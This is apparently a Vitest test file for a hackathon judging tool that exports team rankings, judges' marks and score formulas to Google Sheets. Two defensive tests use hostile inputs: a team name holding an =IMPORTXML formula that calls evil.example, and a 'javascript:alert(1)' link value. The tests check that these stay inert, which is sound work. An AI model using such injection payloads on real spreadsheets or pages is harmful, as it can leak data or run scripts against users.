import { describe, expect, test } from "vitest";

import {
  COMPLETENESS_LABEL,
  linkCell,
  summaryFormula,
  TOP_N,
  type TabState,
  buildMarksRows,
  buildResultsAndMarksRequests,
  buildResultsRows,
  readCompletenessScores,
  topTeams,
} from "~/server/api/utils/results-sheet";
import {
  type MarkRow,
  type TeamInfo,
  buildTeamResults,
} from "~/server/api/utils/team-results";

const team = (id: string, name: string, table: number | null): TeamInfo => ({
  id,
  name,
  table,
  github: null,
  devpost: `https://devpost.com/${id}`,
});

const mark = (
  teamId: string,
  judgeName: string,
  score: number,
  roundType: "regular" | "sponsored" = "regular",
  notes = "",
  superLike = false,
): MarkRow => ({
  teamId,
  judgeId: judgeName,
  judgeName,
  judgeType: roundType === "regular" ? "organizer" : "sponsored",
  roundType,
  score,
  ratings: { impact: score, creativity: score - 1, technical: score },
  notes,
  superLike,
});

const results = buildTeamResults(
  [team("a", "Alpha", 1), team("b", "Bravo", 2), team("c", "Charlie", null)],
  [
    mark("a", "Jo", 6),
    mark("a", "Sam", 7, "regular", "", true),
    mark("b", "Jo", 9),
    mark("b", "Spon", 8, "sponsored", "great demo", true),
  ],
);

describe("buildResultsRows", () => {
  const { rows, groups } = buildResultsRows(results);
  const header = rows[0]!.cells;
  const col = (name: string) => header.indexOf(name);
  const teamRows = rows.filter((r, i) => i > 0 && r.bold);

  test("header names the rubric criteria", () => {
    expect(header).toEqual(
      expect.arrayContaining(["Rank", "Average", "Innovation + Impact"]),
    );
    expect(rows[0]!.bold).toBe(true);
  });

  test("ranks team rows by regular average; unmarked teams last", () => {
    expect(teamRows.map((r) => r.cells[3])).toEqual([
      "Bravo",
      "Alpha",
      "Charlie",
    ]);
    expect(teamRows.map((r) => r.cells[0])).toEqual([1, 2, ""]);
  });

  test("each team row is followed by its judge rows", () => {
    expect(rows.map((r) => r.cells[3])).toEqual([
      "Team / Judge",
      "Bravo",
      "↳ Jo",
      "↳ Spon",
      "Alpha",
      "↳ Jo",
      "↳ Sam",
      "Charlie",
    ]);
  });

  test("team averages are rounded; judge scores go in their round's column", () => {
    const alpha = teamRows.find((r) => r.cells[3] === "Alpha")!.cells;
    expect(alpha[col("Average")]).toBe(6.5);
    expect(alpha[col("Innovation + Impact")]).toBe(6.5);
    const spon = rows.find((r) => r.cells[3] === "↳ Spon")!.cells;
    expect(spon[col("Average")]).toBe("");
    expect(spon[col("Sponsor average")]).toBe(8);
    expect(spon[col("Notes")]).toBe("great demo");
    const sam = rows.find((r) => r.cells[3] === "↳ Sam")!.cells;
    expect(sam[col("Average")]).toBe(7);
  });

  test("super likes: count on team rows, heart on judge rows", () => {
    const cellOf = (label: string) =>
      rows.find((r) => r.cells[3] === label)!.cells[col("Super likes")];
    expect(cellOf("Alpha")).toBe(1);
    expect(cellOf("Bravo")).toBe(1); // a sponsor judge's heart counts too
    expect(cellOf("Charlie")).toBe(0);
    expect(cellOf("↳ Sam")).toBe("♥");
    expect(cellOf("↳ Jo")).toBe("");
  });

  test("groups cover exactly the judge rows; unmarked teams get none", () => {
    expect(groups).toEqual([
      { teamId: "b", start: 2, end: 4 },
      { teamId: "a", start: 5, end: 7 },
    ]);
  });
});

describe("buildMarksRows", () => {
  test("one row per mark with round and notes", () => {
    const rows = buildMarksRows(results);
    const header = rows[0]!.cells;
    expect(rows).toHaveLength(1 + 4);
    const spon = rows.find((r) => r.cells[header.indexOf("Judge")] === "Spon")!;
    expect(spon.cells[header.indexOf("Round")]).toBe("sponsored");
    expect(spon.cells[header.indexOf("Notes")]).toBe("great demo");
    expect(spon.cells[header.indexOf("Super like")]).toBe("♥");
  });
});

const tab = (sheetId: number, extra: Partial<TabState> = {}): TabState => ({
  sheetId,
  rowCount: 1000,
  columnCount: 26,
  rowGroups: [],
  conditionalFormatCount: 0,
  ...extra,
});

describe("Results and Marks", () => {
  test("judge groups are rebuilt and all start collapsed", () => {
    const old = [
      { range: { sheetId: 1, dimension: "ROWS", startIndex: 2, endIndex: 9 } },
    ];
    const requests = buildResultsAndMarksRequests({
      resultsTab: tab(1, { rowGroups: old }),
      marksTab: tab(2),
      results,
      scores: new Map(),
    });
    expect(requests.filter((r) => r.deleteDimensionGroup)).toHaveLength(1);
    expect(requests.filter((r) => r.addDimensionGroup)).toHaveLength(2);
    expect(
      requests
        .filter((r) => r.updateDimensionGroup)
        .every((r) => r.updateDimensionGroup!.dimensionGroup!.collapsed),
    ).toBe(true);
    // Old groups go before anything is written.
    expect(requests.findIndex((r) => r.deleteDimensionGroup)).toBeLessThan(
      requests.findIndex((r) => r.updateCells),
    );
  });

  test("grows the grid when there are more rows than the tab has", () => {
    const requests = buildResultsAndMarksRequests({
      resultsTab: tab(1, { rowCount: 3 }),
      marksTab: tab(2),
      results,
      scores: new Map(),
    });
    const append = requests.find((r) => r.appendDimension)!.appendDimension!;
    expect(append.sheetId).toBe(1);
  });
});

describe("Completeness and Final columns", () => {
  const header = buildResultsRows(results).rows[0]!.cells as string[];
  const at = (label: string) => header.indexOf(label);

  test("every rubric criterion has a column, incl. Technical Complexity", () => {
    expect(header).toEqual(
      expect.arrayContaining([
        "Innovation + Impact",
        "Creativity",
        "Technical Complexity",
        "Design/Polish",
        "Adventurous",
      ]),
    );
    const { rows } = buildResultsRows(results);
    const alpha = rows.find((r) => r.cells[3] === "Alpha")!.cells;
    expect(alpha[at("Technical Complexity")]).toBe(6.5);
  });

  test("Final sits right after Rank; Completeness after Average and the links", () => {
    expect(header.slice(0, 2)).toEqual(["Rank", "Final"]);
    expect(header.slice(5, 9)).toEqual([
      "Average",
      "Devpost",
      "GitHub",
      COMPLETENESS_LABEL,
    ]);
  });

  test("links show a short name, not the whole URL", () => {
    const { rows } = buildResultsRows(results);
    const alpha = rows.find((r) => r.cells[3] === "Alpha")!.cells;
    expect(alpha[at("Devpost")]).toEqual({
      text: "Devpost",
      link: "https://devpost.com/a",
    });
    expect(alpha[at("GitHub")]).toBe("");
    expect(linkCell("github.com/x/y", "GitHub")).toEqual({
      text: "GitHub",
      link: "https://github.com/x/y",
    });
    expect(linkCell("javascript:alert(1)", "GitHub")).toBe(
      "javascript:alert(1)",
    );
  });

  test("team rows get the typed score and a Final formula for their row", () => {
    const { rows } = buildResultsRows(results, new Map([["a", 8]]));
    const alphaIndex = rows.findIndex((r) => r.cells[3] === "Alpha");
    const alpha = rows[alphaIndex]!.cells;
    expect(alpha[at(COMPLETENESS_LABEL)]).toBe(8);
    const sheetRow = alphaIndex + 1;
    expect(alpha[at("Final")]).toEqual({
      formula: `=IF(F${sheetRow}="", "", IF(ISNUMBER(I${sheetRow}), ROUND((F${sheetRow} * 5 + I${sheetRow}) / 6, 2), F${sheetRow}))`,
    });
    const bravo = rows.find((r) => r.cells[3] === "Bravo")!.cells;
    expect(bravo[at(COMPLETENESS_LABEL)]).toBe("");
  });

  test("judge rows leave both blank", () => {
    const { rows } = buildResultsRows(results, new Map([["a", 8]]));
    for (const r of rows.filter((r) => String(r.cells[3]).startsWith("↳"))) {
      expect(r.cells[at(COMPLETENESS_LABEL)]).toBe("");
      expect(r.cells[at("Final")]).toBe("");
    }
  });

  test("validation and red/green status go on team rows only", () => {
    const requests = buildResultsAndMarksRequests({
      resultsTab: tab(1),
      marksTab: tab(2),
      results,
      scores: new Map(),
    });
    const validated = requests
      .filter((r) => r.setDataValidation)
      .map((r) => r.setDataValidation!.range!.startRowIndex);
    expect(validated).toEqual(buildResultsRows(results).teamRows);
    expect(
      requests.filter((r) => r.setDataValidation)[0]!.setDataValidation!.range,
    ).toMatchObject({ startColumnIndex: 8, endColumnIndex: 9 });
    const rules = requests
      .filter((r) => r.addConditionalFormatRule)
      .map((r) => r.addConditionalFormatRule!.rule!);
    expect(rules.map((r) => r.booleanRule!.condition!.type)).toEqual([
      "BLANK",
      "NOT_BLANK",
    ]);
    expect(rules[0]!.ranges!.map((g) => g.startRowIndex)).toEqual(validated);
  });

  test("the summary tab ranks Results' team rows by Final", () => {
    expect(summaryFormula()).toBe(
      '={"Rank", "Team", "Final"; LET(t, SORT(FILTER({Results!D2:D, Results!B2:B}, Results!A2:A<>""), 2, FALSE), {SEQUENCE(ROWS(t)), t})}',
    );
  });
});

describe("keeping typed scores on a re-export", () => {
  const sheetNow = (): unknown[][] => {
    const { rows } = buildResultsRows(results);
    const header = rows[0]!.cells as string[];
    const out: unknown[][] = rows.map((r) =>
      r.cells.map((c) => (typeof c === "object" ? 0 : c)),
    );
    // Someone typed 7 for Alpha, and (wrongly) 5 on a judge row.
    const comp = header.indexOf(COMPLETENESS_LABEL);
    out.find((r) => r[3] === "Alpha")![comp] = 7;
    out.find((r) => String(r[3]).startsWith("↳"))![comp] = 5;
    return out;
  };

  test("reads team-row scores by team ID, ignoring judge rows", () => {
    expect([...readCompletenessScores(sheetNow())]).toEqual([["a", 7]]);
  });

  test("an old Results layout without the column yields nothing", () => {
    expect(
      readCompletenessScores([
        ["Rank", "Team / Judge", "Team ID"],
        [1, "Alpha", "a"],
      ]).size,
    ).toBe(0);
  });

  test("scores from the old Completeness tab carry over; Results wins", () => {
    const scores = readCompletenessScores(sheetNow(), [
      [3, "a"],
      [9, "b"],
      ["", "c"],
    ]);
    expect(scores.get("a")).toBe(7);
    expect(scores.get("b")).toBe(9);
    expect(scores.has("c")).toBe(false);
  });
});

describe("text is never written as a formula", () => {
  test("a team name starting with = stays a string", () => {
    const evil = buildTeamResults(
      [team("x", '=IMPORTXML("https://evil.example","//a")', 1)],
      [mark("x", "=1+1", 5)],
    );
    const requests = buildResultsAndMarksRequests({
      resultsTab: tab(1),
      marksTab: tab(2),
      results: evil,
      scores: new Map(),
    });
    const values = requests
      .flatMap((r) => r.updateCells?.rows ?? [])
      .flatMap((row) => row.values ?? []);
    const formulas = values
      .map((v) => v.userEnteredValue?.formulaValue)
      .filter(Boolean);
    // Only our own Final formula(s), never the team or judge name.
    expect(formulas.every((f) => f!.startsWith("=IF("))).toBe(true);
    expect(
      values.some((v) =>
        v.userEnteredValue?.stringValue?.startsWith("=IMPORTXML"),
      ),
    ).toBe(true);
  });
});

describe("top teams only", () => {
  // 25 teams, each scored once: team t1 gets 25, t2 gets 24, … t25 gets 1.
  const many = buildTeamResults(
    Array.from({ length: 25 }, (_, i) => team(`t${i + 1}`, `T${i + 1}`, i + 1)),
    Array.from({ length: 25 }, (_, i) => mark(`t${i + 1}`, "Jo", 25 - i)),
  );

  test(`keeps the best ${TOP_N} by judge average, best first`, () => {
    const top = topTeams(many);
    expect(top).toHaveLength(TOP_N);
    expect(top[0]!.team.id).toBe("t1");
    expect(top.at(-1)!.team.id).toBe(`t${TOP_N}`);
  });

  test("leaves out teams with no judge marks", () => {
    // Charlie has no marks at all; Bravo only has a judge mark of 9.
    expect(topTeams(results).map((r) => r.team.id)).toEqual(["b", "a"]);
  });

  test("Results and Marks only list the teams passed in", () => {
    const top = topTeams(many, 3);
    const names = buildResultsRows(top)
      .rows.slice(1)
      .map((r) => r.cells[3]);
    expect(
      names.filter((n) => typeof n === "string" && !n.startsWith("↳")),
    ).toEqual(["T1", "T2", "T3"]);
    expect(buildMarksRows(top)).toHaveLength(1 + 3);
  });
});
